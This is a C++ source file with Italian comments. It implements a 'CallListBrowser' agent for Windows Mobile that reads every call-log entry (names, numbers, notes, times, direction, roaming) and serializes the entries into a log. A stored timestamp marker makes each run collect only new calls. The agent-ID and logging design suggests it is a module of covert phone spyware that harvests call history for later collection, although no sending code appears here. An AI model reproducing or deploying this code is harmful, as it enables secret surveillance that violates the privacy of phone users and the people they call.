#include <new>
#include "CallListBrowser.h"

CallListBrowser::CallListBrowser(void) : m_hPhoneCallLog(NULL), m_dwEntries(0)
{
	Serializer = new(std::nothrow) CallListSerializer;
	ZeroMemory(&m_ft, sizeof(FILETIME));
}

CallListBrowser::~CallListBrowser(void)
{
	delete Serializer;
}

void CallListBrowser::Run(UINT uAgentId)
{
	m_uAgentId = uAgentId;

	HRESULT hr = PhoneOpenCallLog(&m_hPhoneCallLog);

	if (hr != S_OK)
		return;

	m_dwEntries = getEntriesNumber();

	if (m_dwEntries > 0) {
		RetrieveCallList();	
	}

	PhoneCloseCallLog(m_hPhoneCallLog);
}

DWORD CallListBrowser::getEntriesNumber()
{
	HRESULT hr = NOERROR;
	DWORD dwEntrieNum = 0;

	hr = PhoneSeekCallLog(m_hPhoneCallLog, CALLLOGSEEK_END, 0, &dwEntrieNum);

	if (hr == E_FAIL) {
		return 0;
	}

	// dall'msdn aggiungere una entry 
	return dwEntrieNum + 1;
}

void CallListBrowser::RetrieveCallList(void)
{
	BOOL bLogCreated = FALSE;
	HRESULT hr = NOERROR;
	UINT	uIndex = 0, uLen;
	CALLLOGENTRY	callEntry;
	CallStruct		callStruct;
	BYTE* pBuf;

	// Ci portiamo all'iniziodella lista
	hr = PhoneSeekCallLog(m_hPhoneCallLog, CALLLOGSEEK_BEGINNING, 0, NULL);

	if (hr == E_FAIL) {
		return;
	}

	ReadMarkupPosition();

	while (uIndex < m_dwEntries) {

		pBuf = NULL;
		uLen = 0;

		CLEAN_CALLSTRUCT(callStruct);
		ZeroMemory(&callEntry, sizeof(CALLLOGENTRY));
		callEntry.cbSize = sizeof(CALLLOGENTRY);
		uIndex++;

		hr = PhoneGetCallLogEntry(m_hPhoneCallLog, &callEntry);
		if (hr != S_OK) {
			FREE_CALLLOGENTRY(callEntry);
			// se sono all'ultimo elemento breakko altrimenti continuo il loop
			if (hr == S_FALSE)
				break;
			else 
				continue;
		}

		BOOL bRet = FillCallEntryStruct(&callEntry, &callStruct, &uLen);
		FREE_CALLLOGENTRY(callEntry);
		if (bRet == FALSE || uLen < CALLLIST_HEADER_LEN) {
			FREE_CALLSTRUCT(callStruct);
			continue;
		}

		pBuf = new(std::nothrow) BYTE[uLen];

		if (pBuf == NULL) {
			FREE_CALLSTRUCT(callStruct);
			continue;			
		}

		Serializer->Serialize(&callStruct, pBuf);
		FREE_CALLSTRUCT(callStruct);

		if (bLogCreated == FALSE) {
			bRet = callListLog.CreateLog(LOGTYPE_CALLLIST, NULL, 0, FLASH);

			if (bRet == FALSE) {
				SAFE_DELETE(pBuf);
				continue;
			}
			bLogCreated = TRUE;	
		}
		callListLog.WriteLog(pBuf, uLen);
		SAFE_DELETE(pBuf);
	}
	callListLog.CloseLog(FALSE);
	WriteMarkupPosition();
}

BOOL CallListBrowser::FillCallEntryStruct(CALLLOGENTRY* TmpCALLLOGENTRY, CallStruct* pTmpCallStruct, UINT* uLen)
{
#define GETSTRING(x, y)													\
	if (TmpCALLLOGENTRY->x != NULL) {									\
		len = wcslen(TmpCALLLOGENTRY->x);								\
		if (len > 0) {													\
			pTmpCallStruct->y = (UINT) sizeof(TCHAR) * len;				\
			pTmpCallStruct->x  = new(std::nothrow) WCHAR[len+1];		\
			ZeroMemory(pTmpCallStruct->x, sizeof(WCHAR)*(len+1));		\
			if (pTmpCallStruct->x == NULL)								\
				pTmpCallStruct->y = 0;									\
			else{														\
				wcscpy_s(pTmpCallStruct->x, len + 1, TmpCALLLOGENTRY->x);\
				*uLen += sizeof(DWORD);									\
				*uLen += pTmpCallStruct->y;								\
			}															\
		}else {															\
			pTmpCallStruct->y = 0;										\
		}																\
	}else{																\
		pTmpCallStruct->x = NULL;										\
		pTmpCallStruct->y = 0;											\
	}

	if(TmpCALLLOGENTRY == NULL || pTmpCallStruct == NULL || uLen == NULL)
		return FALSE;

	if(m_ft.dwHighDateTime != 0 || m_ft.dwLowDateTime != 0) {
		ULARGE_INTEGER time1;
		ULARGE_INTEGER time2;
		time1.HighPart = m_ft.dwHighDateTime;
		time1.LowPart  = m_ft.dwLowDateTime;

		time2.HighPart = TmpCALLLOGENTRY->ftStartTime.dwHighDateTime;
		time2.LowPart  = TmpCALLLOGENTRY->ftStartTime.dwLowDateTime;

		if(time1.QuadPart > time2.QuadPart)
			return FALSE;
	}

	pTmpCallStruct->ftStartTime = TmpCALLLOGENTRY->ftStartTime; 
	pTmpCallStruct->ftEndTime	= TmpCALLLOGENTRY->ftEndTime;
	pTmpCallStruct->dwProperties = 0;

	if(TmpCALLLOGENTRY->fOutgoing)	pTmpCallStruct->dwProperties |= 0x01;	// direction of call.  (Missed calls are incoming.)
	if(TmpCALLLOGENTRY->fConnected)	pTmpCallStruct->dwProperties |= 0x02;	// Did the call connect? (as opposed to busy, no answer)
	if(TmpCALLLOGENTRY->fEnded)		pTmpCallStruct->dwProperties |= 0x04;	// Was the call ended? (as opposed to dropped)
	if(TmpCALLLOGENTRY->fRoam)		pTmpCallStruct->dwProperties |= 0x08;	// Roaming (vs. local)

	*uLen = CALLLIST_HEADER_LEN;

	size_t len = 0;

	GETSTRING(pszName, uNameSize);
	GETSTRING(pszNameType, uNameTypeSize);
	GETSTRING(pszNote, uNoteSize);
	GETSTRING(pszNumber, uNumberSize);

	pTmpCallStruct->cbSize = *uLen;

	return TRUE;
}

void CallListBrowser::ReadMarkupPosition()
{
	if (callListMarkup.IsMarkup(m_uAgentId)){
		BYTE *pDataMarkup = NULL; 
		UINT len = sizeof(FILETIME);

		pDataMarkup = callListMarkup.ReadMarkup(m_uAgentId, &len);

		if (pDataMarkup != NULL) {
			CopyMemory(&m_ft, pDataMarkup, sizeof(FILETIME));
			delete[] pDataMarkup;
		}
	}
	return;
}

void CallListBrowser::WriteMarkupPosition(void)
{
	SYSTEMTIME st;
	GetSystemTime(&st);
	SystemTimeToFileTime(&st, &m_ft);
	callListMarkup.WriteMarkup(m_uAgentId,(BYTE *)&m_ft, sizeof(FILETIME));
	return;
}

//

void CallListSerializer::Serialize(CallStruct* pTmpCallStruct, PBYTE &pBuf)
{
	BYTE *pPtr = pBuf;

	CopyMemory(pPtr, pTmpCallStruct, CALLLIST_HEADER_LEN);
	pPtr += CALLLIST_HEADER_LEN;

	if(pTmpCallStruct->uNameSize > 0){
		UINT serlen = _SerializeString(pPtr, pTmpCallStruct->pszName, CALLLIST_STRING_NAME);	
		pPtr += serlen;
	}
	if(pTmpCallStruct->uNameTypeSize > 0){
		UINT serlen = _SerializeString(pPtr, pTmpCallStruct->pszNameType, CALLLIST_STRING_NAMETYPE);	
		pPtr += serlen;
	}
	if(pTmpCallStruct->uNoteSize > 0){
		UINT serlen = _SerializeString(pPtr, pTmpCallStruct->pszNote, CALLLIST_STRING_NOTE);	
		pPtr += serlen;
	}
	if(pTmpCallStruct->uNumberSize > 0){
		UINT serlen = _SerializeString(pPtr, pTmpCallStruct->pszNumber, CALLLIST_STRING_NUMBER);	
		pPtr += serlen;
	}
}

DWORD CallListSerializer::_SerializeString(LPBYTE lpDest, LPTSTR lpString, int entryType)
{
	ASSERT(lpDest);
	DWORD dwStringLength = 0;

	if (lpString == NULL)
		return 0;

	dwStringLength = wcslen(lpString) * sizeof(WCHAR);
	if (dwStringLength == 0)
		return 0;

	// copy prefix and string *** WITHOUT NULL TERMINATOR ***
	DWORD prefix = _Prefix(dwStringLength, entryType);
	CopyMemory(lpDest, &prefix, sizeof(prefix));
	CopyMemory((lpDest + sizeof(prefix)), lpString, dwStringLength);

	return sizeof(prefix) + dwStringLength;
}

DWORD CallListSerializer::_Prefix(DWORD dwLength, int entryType)
{
	DWORD prefix = dwLength;
	prefix &= CALLLIST_TYPE_MASK;    // clear type bits
	prefix |= (DWORD)entryType; 

	return prefix;
}